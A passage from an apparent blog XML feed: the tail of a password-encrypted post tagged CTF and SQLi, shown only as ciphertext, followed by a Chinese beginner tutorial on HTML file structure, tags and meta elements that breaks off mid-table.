46d85bd368f603bdef5378f188a3521cb05ed43c1517a326d20174842895d3163a32e719c013d98028a76fd4566bb44fd352c317cac17bcd656f792b0411059112b9dceab9e7646fb0dcc78f10c3b3b8b606c12193aa3ddb058e53eaceb8f2d6b4f6880170fc70757ea49a15453384c1b74541c93aa924918cfae070c0a6251cfcee79e59f8e1d24a6ebbdb0c46e32936835a372301ef3b9fe0fea62de7d7ffff7f6a7399d858be0ff4be86a3ab9c0a005614c3111c42b9e12858e29044e19c2a4f99ace535e0f2ded909eeeeaae6e7f4760da31ae51846a37ca75415d85296d2be5d5651ef8acf65da87151a0cc2d1ba05a0f60fe262898d2368186792810af60e1a420340be7960121f33a1f00cd225806bb11485decac325fa2ea7ca074a7200e8e09dc93a86039d42ba46f49361f38ab1b8f99640a50254fa6acc2dd34fa78b40592f1d17e0d0fb5302f8a29633ec4dfd020fcb9b54e860f29f47e585c4c772e20211f077aeb9bb6254f51bc23da055ad86f28ced47f28e9ec73caa37efc0f17f9ca56948f3c902600ed14bdf43bb095968ab103486a40b5e85fb91b9a519faa949d885fc86b7e9cd372bb08fa32667a9985a47ba4c0ee8f88d6d15d247448a140274c6e34dd1b1ff3b0a1ef65353aa7123a39e8ce0717e812ae7a706165f58b83f52e8e756afc6dec8317ef073e1d1658071b9a128186f62e1ba992f51c897693a856f419b6c2a01f005eb7646b3c374968f69d9f4320ec40a9058a784b5637933f811bbd6960dfb6ca8db32fbd5321d2a124ccdd071cba2bb5074d3ac6bd710478d35c8b9c8d214158bd614a80cf93cb15fd64db2a86091eeeb6ab9343ee8be7157e02a23c1e99918478d31f45c599f81e6cd2d2aa675f86c39c82b6091cfb40da11cf391457346569fde40fd4cec7982607a26e9f0641bf9886d74e70c57b65f3fdbcfc5e645fd6486887a664ff80774ecef6f20f35562892f031fe6ed0f8e24250d93d19fcdbc408ea8cbaf92aa503d60bffd1fea3a8395b20ca64033c73f0872cf166f12b85bd1ae356bbb15a8533c98b045f89f762be331a422a325796bf58bb7ac8f9d6b1e32b3d5d4c0a450e7604cba7e5a6a15e0cc9ea539ad3124659c243999c30a427fbe04bbd69f8afbf9926e281951e49822ba27d2f7b527ac53e6b62a531266593ca092382d63f7c86f5fe72019d065b703fdbc48b266dba583e294bc91ebb4b13593cf26398fcdd8b8e7685c51d1044da508685f353d4c5b2d8c91346d6b2cee2b83f5186da206e15156bd412f83f7ebd75e46cbed9913ca1d9cffc325ad40c83a2f720762434b78ff5a3b62c0bade88ff284acb80e5dc0506de97d76181001ae4a78d813570eed421ed84308e95dd0de5fa6c3b8b994c5ba8c07360c63901ff4d6fde8e49b406cbfbc096ee4e33c8328918a3f2ab194ca6c1cc68b7120d824b2e29bd14e798cbc6242f2f894d241ec9f2c0297ffc2361fb4f72aecd6673719b9ae55318d52db96a910faf27bd0021bf8bc6dc45877555617f220116b9fc63d1a122466f56f7bfaabd21d6dddb0eb09fc774a4cca8f80f2f6f4e19d8a94b4d03af477c184ac32bcf121b254c7ec35a16b8cbdad9023444ba66abac5421a9e3aa62fd15dbbd3399b77a54b1e32ae274856ba0382bbf3ba1824c62d07a4dc4df6da92edd169612f433147f4ae160f603d01cfb9322f9927c7e3be5e25b9b86f56bcc9c268d3a80c4c8b5442e1e18a31294f5aa814517f8394e223b8531ab1a877858825788ef7adb9b9c65ae5c0027c647ca6bcc21c264e965fcdf758b5eb295389a53a0fab11d4274f3e4fb2d7f975df709f42d44864dab3655dbd7ebcf01cc546662bd56e894555b33ea47161321c634cf7c6e7ce80bc0cc019d103401e75ea0be7ef237ca1a842c5afa8159ce95d1c7576e05c2052be172411f8768d078ce8d726d587636ab4de7bf4ddf57ece6cc48e2a62847f4653cc7b51a124cb0f21413ca2c827d26cdad9daa249feb3e8dc11e1360b6507986cc0f0fdfd4ad9b1c092ddc511b1ac2915e98f996fca38763c4cae6f72142943deed57571f64bcd</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML-基础</title>
    <url>/post/HTML-basics/</url>
    <content><![CDATA[<p>使用HTML标记实际上也就是使用标签和其属性 ( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾</p>
<a id="more"></a>


<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>HTML 基础</font> </center>






<br>

<br>

<h3 id="一-HTML-初识"><a href="#一-HTML-初识" class="headerlink" title="一. HTML 初识"></a><font color="#FF6347" face="Comic sans MS">一. HTML 初识</font></h3><p>当您保存 HTML 文件时，既可以使用 .htm 也可以使用 .html 扩展名。两者没有区别，完全根据您的喜好。</p>
<br>

<p><strong>HTML标签编写规范</strong></p>
<p>HTML<font color="#FF7F00"><strong>标记不区分大小写</strong></font>。如：<code>&lt;font&gt;</code>、<code>&lt;Font&gt;</code>、<code>&lt;fOnt&gt;</code>。单特殊符号必须小写，如<code>&amp;nbsp</code>。</p>
<p>HTML标记属性可有可无。有的标记是没有属性的，如：<code>&lt;html&gt;</code>、<code>&lt;head&gt;</code>、<code>&lt;title&gt;</code>等</p>
<p>双边标记的内容在开始和结束标签之间，单边标记没有内容。</p>
<p>HTML标记可以相互嵌套，但一定注意是顺序嵌套，外层套内层，一层套一层。</p>
<br>

<p><font color="#00B2EE"><strong>HTML，Hypertext Markup Language ,超文本标注语言。</strong></font>HTML是一种规范，是一种标准，编写网页的一种标准。<br><font color="#00B2EE"></font></p>
<ul>
<li><strong>超文本：</strong>就是网页上不光有文本，还有图片、音乐、视频等。</li>
<li><strong>标注：</strong>是一种记号，是一种标志。如：红绿灯</li>
<li><strong>语言：</strong>这里的“语言”就是代码，跟所谓“程序语言”一点关系都没有。</li>
</ul>
<p><strong>HTML的主要目的：</strong><font color="#FF7F00"><strong>就是用来显示网页的不同效果、不同部分。如：<code>&lt;b&gt;文本&lt;/b&gt;</code></strong></font></p>
<br>

<br>

<h4 id="1-1-HTML文件结构"><a href="#1-1-HTML文件结构" class="headerlink" title="1.1 HTML文件结构"></a><font color="#3CB371" face="Comic sans MS">1.1 HTML文件结构</font></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;php.cn&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">这里是存放网页内容的</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br>


<p><strong>HTML 页面整体构成</strong><br>用浏览器打开任意一个网页，右键选择查看网页源码，就可以看到网站的HTML代码，总结一下，整体结构如下图：</p>
<p><img data-src="https://i.loli.net/2019/03/08/5c823abe1bb83.png" alt=" 1.png"></p>
<p><font color="#00B2EE" face="Microsoft YaHei"><strong>一、HTML文件结构的说明：</strong></font></p>
<ul>
<li><p><strong><code>&lt;!DOCTYPE HTML&gt;</code>：</strong>html5标准网页声明，<font color="#FF7F00"><strong>必须放在 HTML 文档的第一行</strong></font>，位于<code>&lt;html&gt;</code>标签之前。声明有助于浏览器中正确显示网页。</p>
</li>
<li><p><strong><code>&lt;html&gt;&lt;/html&gt;</code>：</strong>告诉浏览器，其中的代码用什么格式(图片、视频)来编译。</p>
</li>
<li><p><strong><code>&lt;head&gt;&lt;/head&gt;</code>：</strong>头部中包含的标记是页面的标题、序言、说明等内容，它本身<font color="#FF7F00"><strong>不作为内容来显示</strong></font>，但影响网页显示的效果。</p>
<ol>
<li>下面<font color="#FF7F00"><strong>这些标签可用在 head 部分：<code>&lt;title&gt;</code>,<code>&lt;meta&gt;</code>,  <code>&lt;base&gt;</code>, <code>&lt;link&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;style&gt;</code></strong></font>。</li>
<li>头部中最常用的标记符是标题标记符<code>&lt;title&gt;页面标题&lt;/title&gt;</code>和<code>&lt;meta&gt;</code>标记符，其中标题标记符用于定义网页的标题，它的内容显示在网页窗口的标题栏中，网页标题可被浏览器用作书签和收藏清单。</li>
<li>设置文档标题和其它在网页中不显示的信息，比如direction方向、语言代码Language Code（实体定义!ENTITY % i18n）、指定字典中的元信息、等等。</li>
</ol>
</li>
<li><p><strong><code>&lt;body&gt;&lt;/body&gt;</code>：</strong>是网页主要内容的显示区域。网页中显示的实际内容均包含在这2个正文标记符之间。正文标记符又称为实体标记。网页中99%的内容都必须放在<code>&lt;body&gt;</code>。只有放在<code>&lt;body&gt;</code>中，最终浏览器翻译以后，才能看见结果。</p>
</li>
</ul>
<br>

<p><font color="#00B2EE" face="Microsoft YaHei"><strong>二、关于头部<code>&lt;head&gt;&lt;/head&gt;</code>中常用的两个标签<code>&lt;title&gt;&lt;/title&gt;</code>和<code>&lt;meta&gt;</code>：</strong></font></p>
<ol>
<li><p><strong><code>&lt;title&gt;纯文本&lt;/title&gt;</code></strong><font color="#FF7F00"><strong>中只能是纯文本，任何标记都会原封不动的显示。</strong></font></p>
</li>
<li><p>**<code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</code>**功能：告诉浏览器，如何翻译汉字。</p>
<ol>
<li><strong>http-equiv：</strong>模拟http协议的文件头原信息，主要目的是服务器向客户端返回时，用什么格式显示。</li>
<li><strong>Content-type：</strong>内容类型。</li>
<li><strong>Content：</strong>详细内容类型介绍。</li>
<li><strong>Text/html：</strong>网页是text格式，html是文本中的小格式。</li>
<li><strong>Charset：</strong>字符集，主要控制汉字如何显示。</li>
<li><strong>Utf-8：</strong>多国语言编码，什么国家的语言都可以正常显示。</li>
</ol>
</li>
</ol>
<br />

<br />

<h4 id="1-2-HTML文件组成"><a href="#1-2-HTML文件组成" class="headerlink" title="1.2 HTML文件组成"></a><font color="#3CB371" face="Comic sans MS">1.2 HTML文件组成</font></h4><blockquote>
<p><font color="#FF7F00"><strong>HTML 是什么</strong></font></p>
</blockquote>
<ol>
<li>HTML 是用来描述网页的一种语言。</li>
<li>HTML 不是一种编程语言，而是一种标记语言</li>
<li>标记语言是一套标记标签 (markup tag)</li>
<li>HTML 使用标记标签来描述网页</li>
<li>HTML 文档包含了HTML 标签及文本内容</li>
<li>HTML文档也叫做 web 页面</li>
</ol>
<br>

<blockquote>
<p><font color="#FF7F00"><strong>HTML 标签</strong></font></p>
</blockquote>
<ol>
<li>HTML 标记标签通常被称为 HTML 标签 (HTML tag)。</li>
<li>HTML 标签是由尖括号包围的关键词，比如 <code>&lt;html&gt;</code></li>
<li>HTML 标签通常是成对出现的，比如 <code>&lt;b&gt;</code> 和 <code>&lt;/b&gt;</code>。也有单边标签，只有开始标签，而没结束标签，单边标签一般是没有内容。如：<code>&lt;br&gt;</code></li>
<li>标签对中的第一个标签是开始标签，第二个标签是结束标签</li>
<li>开始和结束标签也被称为开放标签和闭合标签</li>
<li>标签语法格式：<ol>
<li><strong>双边标签：<code>&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;内容&lt;/标签&gt;</code></strong></li>
<li><strong>单边标签：<code>&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;</code></strong></li>
</ol>
</li>
</ol>
<br>

<blockquote>
<p><font color="#FF7F00"><strong>HTML 元素</strong></font></p>
</blockquote>
<ol>
<li>“HTML 标签” 和 “HTML 元素” 通常都是描述同样的意思.</li>
<li>但是严格来讲, 一个 HTML 元素包含了开始标签与结束标签，如下实例:</li>
<li>HTML 元素:<code>&lt;p&gt;这是一个段落。&lt;/p&gt;</code></li>
</ol>
<hr size="2" color="#00B2EE" width="100%" noshade>

<ul>
<li><p>HTML元素是组成HTML文档最基本的部件，它是用标签来表现的，一般来说，“起始标签”表示元素的开始，“结束标签”表示元素的结束。</p>
</li>
<li><p>HTML元素分为“有内容的元素”和“空元素”两种。</p>
</li>
<li><p>“有内容的元素”是由起始标签、结束标签以及两者之间的元素内容组成的，其中元素内容既可以是需要显示在网页中的文字内容，也可以是其它元素。</p>
</li>
</ul>
<hr size="2" color="#00B2EE" width="100%" noshade>

<br>

<blockquote>
<p><font color="#FF7F00"><strong>HTML 元素属性</strong></font></p>
</blockquote>
<ol>
<li>HTML 标签可以拥有属性。属性提供了有关 HTML 元素的更多的信息。</li>
<li>属性总是以名称/值对的形式出现，比如：<code>name=&quot;value&quot;</code>。</li>
<li>属性值应该始终被包括在<strong>引号内</strong>。双引号是最常用的，不过使用单引号也没有问题。</li>
</ol>
<hr size="2" color="#00B2EE" width="100%" noshade>

<ul>
<li>HTML的元素属性提供了对HTML元素的描述和控制信息，借助于元素属性，HTML网页才会展现丰富多彩且格式美观的内容。</li>
<li>例如要设置<code>&lt;p&gt;</code>元素中文字内容的颜色为红色，字号为30像素，这时就需要用到HTML元素属性了。如在<code>&lt;p&gt;</code>元素名称的尖括号内添加了<code>style=&quot;color:#ff0000;font-size:30px&quot;</code>内容，浏览器就会按照设定的效果来显示内容。</li>
</ul>
<hr size="2" color="#00B2EE" width="100%" noshade>



<br>

<br>

<h3 id="二-HTML-标签"><a href="#二-HTML-标签" class="headerlink" title="二. HTML 标签"></a><font color="#FF6347" face="Comic sans MS">二. HTML 标签</font></h3><br>


<h4 id="2-1-标签介绍"><a href="#2-1-标签介绍" class="headerlink" title="2.1 标签介绍"></a><font color="#3CB371" face="Comic sans MS">2.1 标签介绍</font></h4><p>按功能排序HTML的标签请参考：<font color="#00B2EE">《<a href="http://www.runoob.com/tags/ref-byfunc.html">HTML 标签参考手册- (HTML5 标准)</a>》</font> </p>
<p><strong>HTML标签分两类：</strong>双边标签和单边标签。</p>
<br>

<p><strong>1. 双边标签</strong></p>
<ul>
<li>双边标签，是指有开始和结束标签，内容放在开始和结束标签之间。如：<code>&lt;b&gt;内容&lt;/b&gt;</code></li>
</ul>
<ul>
<li><p>“属性”的通俗理解：一个东西总是有一些特征，重量，体积等，这就是一个东西的“属性”</p>
</li>
<li><p><strong>语法格式：<code>&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;内容&lt;/标签&gt;</code></strong></p>
</li>
</ul>
<br>

<p><strong>2. 单边标签</strong></p>
<ul>
<li><p>单边标签，只有开始标签，而没结束标签，单边标签一般是没有内容。如：<code>&lt;br&gt;</code></p>
</li>
<li><p>单边标签一般起一个特殊的功能。</p>
</li>
<li><p>单边标签常用的有10多个标记。</p>
</li>
<li><p><strong>语法格式：<code>&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;</code></strong></p>
</li>
</ul>
<br>

<p>先来看一下双边标签例子，观察<code>&lt;font&gt;&lt;/font&gt;</code>标签</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;directoree.top&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body &lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/08/5c82461ac1553.png&quot;</span>&gt;&gt;</span><br><span class="line">        &lt;h1&gt;第一个，哈哈哈哈&lt;/h1&gt;</span><br><span class="line">       &lt;font size=<span class="string">&quot;6&quot;</span> color=<span class="string">&quot;red&quot;</span>&gt;看看我有什么特别的&lt;/font&gt;&lt;/font&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>运行如下图：</p>
<p><img data-src="https://i.loli.net/2019/03/08/5c828faaaf57d.jpg" alt="3.png"></p>
<br>

<p>再来看一下单边标签例子，观察<code>&lt;br&gt;</code>标签</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;treecatee.github.io&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body &lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/08/5c82461ac1553.png&quot;</span>&gt;&gt;</span><br><span class="line">        &lt;h1&gt;第二个，哈哈哈哈&lt;/h1&gt;</span><br><span class="line">        &lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">       &lt;font size=<span class="string">&quot;6&quot;</span> color=<span class="string">&quot;red&quot;</span>&gt;再看看我有什么特别的&lt;/font&gt;</span><br><span class="line">       &lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">       &lt;font size=<span class="string">&quot;6&quot;</span> color=<span class="string">&quot;red&quot;</span>&gt;再看看我有什么特别的&lt;/font&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>运行如下图：</p>
<p><img data-src="https://i.loli.net/2019/03/08/5c828fa9efed8.jpg" alt="4.png"></p>
<br>

<p><strong>HTML标签编写规范</strong></p>
<p>HTML<font color="#FF7F00"><strong>标记不区分大小写</strong></font>。如：<code>&lt;font&gt;</code>、<code>&lt;Font&gt;</code>、<code>&lt;fOnt&gt;</code>。单特殊符号必须小写，如<code>&amp;nbsp</code>。</p>
<p>HTML标记属性可有可无。有的标记是没有属性的，如：<code>&lt;html&gt;</code>、<code>&lt;head&gt;</code>、<code>&lt;title&gt;</code>等</p>
<p>双边标记的内容在开始和结束标签之间，单边标记没有内容。</p>
<p>HTML标记可以相互嵌套，但一定注意是顺序嵌套，外层套内层，一层套一层，不能交叉嵌套。</p>
<br>

<hr size="2" color="#00B2EE" width="100%" noshade>
<hr size="2" color="#00B2EE" width="100%" noshade>



<br>


<h4 id="2-2-常用标签-文本"><a href="#2-2-常用标签-文本" class="headerlink" title="2.2 常用标签-文本"></a><font color="#3CB371" face="Comic sans MS">2.2 常用标签-文本</font></h4><ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;!DOCTYPE HTML&gt;</code></strong> html5标准网页声明（必须有）</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;html&gt;&lt;/html&gt;</code></strong> 声明代码格式（必须有）</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;head&gt;&lt;/head&gt;</code></strong> 文件头（必须有）<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;title&gt;&lt;/title&gt;</code></strong> 标题（必须有）</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;meta&gt;</code></strong> 元数据  …..</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;body&gt;&lt;/body&gt;</code></strong>&emsp;**<code>&lt;h1&gt; - &lt;h6&gt;</code>**（必须有）</li>
<li><input disabled="" type="checkbox"> 文本标签<ul>
<li><input disabled="" type="checkbox"> <strong><code>&lt;b&gt;&lt;/b&gt;</code></strong> 加粗</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;i&gt;&lt;/i&gt;</code></strong> 斜体</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;u&gt;&lt;/u&gt;</code></strong> 下划线</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;s&gt;&lt;/s&gt;</code></strong> 删除线</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;sup&gt;&lt;/sup&gt;</code></strong> 上标</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;sub&gt;&lt;/sub&gt;</code></strong> 下标</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;font&gt;&lt;/font&gt;</code></strong> 字体标记<ul>
<li><input disabled="" type="checkbox"> <strong><code>size</code></strong> 大小(1 -&gt; 7)</li>
<li><input disabled="" type="checkbox"> <strong><code>color</code></strong> 颜色</li>
<li><input disabled="" type="checkbox"> <strong><code>face</code></strong> 字体</li>
</ul>
</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;p&gt;&lt;/p&gt;</code></strong> 表示一个段落</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;br&gt;</code></strong> 换行 </li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;hr&gt;</code></strong> 段落分割线 </li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;pre&gt;&lt;/pre&gt;</code> <code>&lt;code&gt;&lt;/code&gt;</code></strong> 定义预格式化的文本和格式代码块</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;strong&gt;</code>和<code>&lt;em&gt;</code></strong> 加粗和斜体（强调）</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;span&gt;&lt;/span&gt;</code></strong> 对文档中的行内元素进行组合</li>
</ul>
<br>

<p><font size="4" face="Microsoft YaHei"><strong>1. <code>&lt;head&gt;&lt;/head&gt;</code>头标签</strong></font></p>
<blockquote>
<p>**<code>&lt;head&gt;</code>**内的元素可包含脚本，指示浏览器在何处可以找到样式表，提供元信息等。<br>可添加到head部分的标签：<code>&lt;title&gt;</code>、<code>&lt;base&gt;</code>、<code>&lt;meta&gt;</code>、<code>&lt;link&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;style&gt;</code>:</p>
</blockquote>
<ul>
<li><strong><code>&lt;title&gt;</code>：</strong>指定整个网页的标题，在浏览器最上方显示。</li>
<li><strong><code>&lt;base&gt;</code>：</strong>为页面上的所有链接规定默认地址或默认目标(target)。</li>
<li><strong><code>&lt;meta&gt;</code>：</strong>提供有关页面的基本信息。</li>
<li><strong><code>&lt;script&gt;</code>：</strong>定义客户端脚本，如JavaScript。</li>
<li><strong><code>&lt;style&gt;</code>：</strong>定义内部样式表与网页的关系。</li>
</ul>
<br>

<ol>
<li><p><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;title&gt;&lt;/title&gt;</code>：标签定义文档的标题。</strong></font> <br></p>
<ol>
<li>title 元素在所有 HTML/XHTML 文档中都是必需的，无属性；</li>
<li><code>&lt;title&gt;纯文本&lt;/title&gt;</code>中间只能是纯文本；</li>
<li>title 元素能够：<ol>
<li>定义浏览器工具栏中的标题</li>
<li>提供页面被添加到收藏夹时显示的标题</li>
<li>显示在搜索引擎结果中的页面标题</li>
<li>告诉用户和搜索引擎这个网页的主要内容是什么，</li>
<li>搜索引擎可以通过网页标题，迅速的判断出当前网页的主题。</li>
</ol>
</li>
</ol>
</li>
</ol>
<br>

<hr size="2" color="#00B2EE" width="100%" noshade>


<ol start="2">
<li><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;meta&gt;</code>：标签</strong></font> <br><ol>
<li><code>&lt;meta&gt;</code> 标签提供关于 HTML 文档的元数据。</li>
<li>元数据不会显示在页面上，但是对于机器是可读的。</li>
<li>典型的情况是，meta 元素被用于规定页面的描述、关键词、文档的作者、最后修改时间以及其他元数据。</li>
<li><code>&lt;meta&gt;</code> 标签始终只能位于 head 元素中。但是头部可以有多个<code>&lt;meta&gt;</code> 标签。</li>
<li>元数据可用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他 web 服务。</li>
<li><strong>包含属性：（有属性就必须有对应的值(content)）</strong><ol>
<li><font color="#FF7F00"><strong>content：</strong></font>必须属性。<ol>
<li>定义与 http-equiv 或 name 属性相关的元信息，content中的内容其实就是各个参数的变量值。</li>
<li>变量值可以有多个，用半角逗号<code>,</code>隔开。</li>
</ol>
</li>
<li><font color="#FF7F00"><strong>http-equiv：</strong></font>可选属性。可选值：<ol>
<li><strong><code>content-type</code>，内容类别</strong>，用于设置页面的类别和语言字符集。编写格式<code>&lt;meta http-equiv=“content-type” context=“text/html”；charset=“gb2312”/&gt;</code>，content属性的值代表页面采用HTML代码输出，字符集为gb2312（简体中文），国际化网站开发的话，为了字符统一，建议charset采用utf-8.</li>
<li><strong><code>refresh</code>。刷新</strong>，用于设置多长时间内网页自己刷新一次，或者用一段时间自动跳转到其他页面，第一种编写格式<code>&lt;meta http-equiv=“refresh” context=“30”/&gt;</code>表示隔30秒刷新一次，第二种编写格式<code>&lt;meta http-equiv=“refresh” context=“30；url=www.google.com”/&gt;</code>，表示30秒后页面自动跳转到<a href="http://www.google.com网站/">www.google.com网站</a></li>
</ol>
</li>
<li><font color="#FF7F00"><strong>name：</strong></font>可选属性。<ol>
<li>用于页面的关键字和描述，是写给搜索引擎看的；</li>
<li>与之对应的属性值为content，content中的内容主要是便于搜索引擎机器人查找信息和分类信息用的。</li>
<li>主要用于描述网页的内容，用于对搜索引擎的优化，必须重点掌握。正确地设置name属性，以便搜索引擎（比如google，baidu）的搜索机器人查找，分类，搜索引擎一般都会自动查找meta值来给网页分类。name的取值(content)如下：<ol>
<li>**<code>keywords</code>**。即关键字，用于说明网页所包含的关键字等信息，从而提高被搜索引擎搜索到的概率。编写格式为<code>&lt;meta name=&quot;keywords&quot; content =“关键字”/&gt;</code>，content属性的值为用户所设置的具体关键字。（一般可设置多个关键字，他们之间用英文半角的逗号分开，搜索引擎都限制关键字的数量，所以关键字内容要简洁精练）</li>
<li>**<code>description</code>**。中文意思为”描述”，用于描述网页的主要内容、主题等，合理设置也可以提高被搜索引擎搜索到的概率。格式为<code>&lt;meta name=&quot;description&quot; content =“对页面的描述”/&gt;</code>，content属性值为用户所设置的页面具体描述的内容，最多容纳1024个字符，但搜索引擎一边只显示约前175个字符。</li>
<li>**<code>author</code>**。作者，用于设置网站作者的名称，比较专业的网站经常用到。格式为<code>&lt;meta name=&quot;author&quot; content =“作者名称”/&gt;</code></li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<p>可参读：<font color="#00B2EE">《<a href="http://www.php.cn/code/443.html">HTML &lt;head&gt; 元素</a>》</font> 、<font color="#00B2EE">《<a href="https://www.cnblogs.com/tielemao/archive/2018/05/25/9086693.html">HTML-head头部浅析</a>》</font> </p>
<br>

<p>例1：打开该网页后每隔20秒刷新一次</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;20&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;这是个展示网页hhh&lt;/h1&gt;</span><br><span class="line">        &lt;h2&gt;希望你能够在这里学的开心&lt;/h2&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br>

<p>例2：打开该网页20秒后跳转到百度首页</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;2;url=http://www.baidu.com&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;                  <span class="string">&#x27;注意这里的2后是分号“;” &#x27;</span></span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;跳转网页hhh&lt;/h1&gt;</span><br><span class="line">        &lt;h2&gt;希望你能够在这里学的开心&lt;/h2&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>


<br>

<hr size="2" color="#00B2EE" width="100%" noshade>

<ol start="3">
<li><p><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;base&gt;</code>：标签</strong></font> <br> </p>
<p><code>&lt;base&gt;</code> 标签为页面上的所有链接设置默认的地址或默认的目标（target）</p>
</li>
</ol>
<br>

<ol start="4">
<li><p><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;link&gt;</code>：标签</strong></font> <br> </p>
<p><code>&lt;link&gt;</code> 标签定义文档与外部资源之间的关系。</p>
</li>
</ol>
<br>

<ol start="5">
<li><p><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;style&gt;</code>：标签</strong></font> <br> </p>
<p><code>&lt;style&gt;</code> 标签用于为 HTML 文档定义样式信息。</p>
</li>
</ol>
<br>

<ol start="6">
<li><p><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;script&gt;&lt;/script&gt;</code>：标签</strong></font> <br></p>
<p><code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如JavaScript。</p>
</li>
</ol>
<br>

<p><font size="4" face="Microsoft YaHei"><strong>2. <code>&lt;body&gt;</code>标签和标题</strong></font></p>
<p>HTML 标题（Heading）是通过<code>&lt;h1&gt; - &lt;h6&gt;</code>标签来定义的。</p>
<p><code>body</code>用法如下：</p>
<table>
<thead>
<tr>
<th align="left">用法</th>
<th align="left">作用</th>
<th align="left">可选属性/是否赞成使用该属性</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>&lt;body&gt;内容&lt;/body&gt;</code></td>
<td align="left">定义文档的主体</td>
